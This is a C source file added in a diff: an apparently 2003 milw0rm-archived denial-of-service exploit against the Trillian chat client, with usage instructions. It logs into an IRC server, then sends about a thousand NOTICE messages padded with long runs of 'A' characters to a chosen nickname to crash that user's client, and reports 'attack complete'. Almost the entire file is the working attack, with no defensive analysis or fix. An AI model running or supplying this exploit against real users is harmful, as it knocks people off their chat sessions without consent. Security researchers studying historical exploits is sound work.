@@ -1,0 +1,149 @@
+/*
+
+[--------------------------------------------]
+[:::::::::::::::::: trillian 0.7*(d patch)   ]
+[:::::Denial:of:Service::simple:exploit::]
+[-----------------------------[l0bstah]-----]
+[usage ::                                           ]
+[      : trillah name attacked-nick          ]
+[                                                       ]
+[comment:: after patch .74d, exploits,  ]
+[         wich use damage (~4095 data)  ]
+[         not work, but this exploit           ]
+[         work at any patch.                    ]
+[                                                       ]
+[P.S. irc specification include rull:          ]
+[510 characters maximum allowed for   ]
+[the command and its parameters...     ]
+[that is why szBuf has 570 length...       ]
+[--------------------------------------------]
+
+*/
+
+ #include <winsock.h>
+ #include <iostream.h>
+ #include <stdio.h>
+ #include <dos.h>
+
+ #define port    4384
+ #define bfsize  540
+ #define rptimes 1000
+
+ WSADATA     wsadata;
+ SOCKADDR_IN sa;
+ SOCKET      s;
+ LPHOSTENT   lpHostEntry;
+ int         SockAddr = sizeof(struct sockaddr);
+ int         i, ports;
+ char        szBuf[570];          // [damage data] 
+ char        nick[50];            // <NICK> command 
+ char        user[50];            // <USER> command 
+ char        mode[50];            // <MODE> command 
+ char        *cname = "trillah";  // your client name
+
+
+int main(int argc, char **argv)
+ {
+
+   printf("::::::::::::::::::::::::::::::::::::\n");
+   printf(": trillah - remote DoS exploit :::::\n");
+   printf(":::::::::::::::::::::::::::[l0bstah]\n");
+
+   if (argc < 3) 
+   { printf("use: trillah dnsname nick\n"); return 0; }
+   
+   char *addr=argv[1];
+   ports=port;
+
+   if (WSAStartup(0x0101,&wsadata) == 0)
+   {
+
+        lpHostEntry = gethostbyname(addr);
+
+        sa.sin_family = AF_INET;
+        sa.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
+        sa.sin_port = htons(ports);
+
+        if ((s=socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET)
+        {
+        printf("Can't open socket! - #%d\n",WSAGetLastError());
+        exit(0);
+        }
+
+        printf("connecting to irc server : %s...\n", addr);
+
+        if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) == -1)
+        {
+        printf("Can't connect() - #%d\n",WSAGetLastError());
+        exit(0);
+        }       
+        printf("connected... starting login session \n\n");
+
+        //*** NICK <NICK>
+        strcpy(nick, "NICK ");
+        strcat(nick, cname);
+        strcat(nick, "\n");
+        send(s,
+                nick,
+                strlen(nick),
+                0);
+
+        printf(nick);
+
+        //*** USER <mode> <unused> <realname>
+        strcpy(user, "USER ");
+        strcat(user, cname);
+        strcat(user, " 0 127.0.0.1 : trilla\n");
+        send(s,
+                user,
+                strlen(user),
+                0);
+
+        printf(user);
+
+        sleep(1);
+
+        //*** MODE <nick> (+|-*)
+        strcpy(mode, "MODE ");
+        strcat(mode, cname);
+        strcat(mode, " +i\n");
+        send(s,
+                mode,
+                strlen(mode),
+                0);
+
+        sleep(2);
+
+        //**********DAMAGE****DATA*************//
+
+        printf("Sending damage data...\n");
+        strcat(szBuf, "NOTICE ");
+        strcat(szBuf, argv[2]);
+        strcat(szBuf, " :");
+        for(i=0;i<=bfsize;i++) strcat(szBuf,"A");
+        strcat(szBuf, "\n");
+
+
+        for (i=0;i<=rptimes;i++)
+        {
+
+        send(s,
+            szBuf,
+            strlen(szBuf),
+            0);
+        }
+
+
+        printf("attack complete....");
+
+        //*************************************//
+
+        closesocket(s);
+        
+        }
+
+  WSACleanup();
+
+}
+
+// milw0rm.com [2003-08-01]
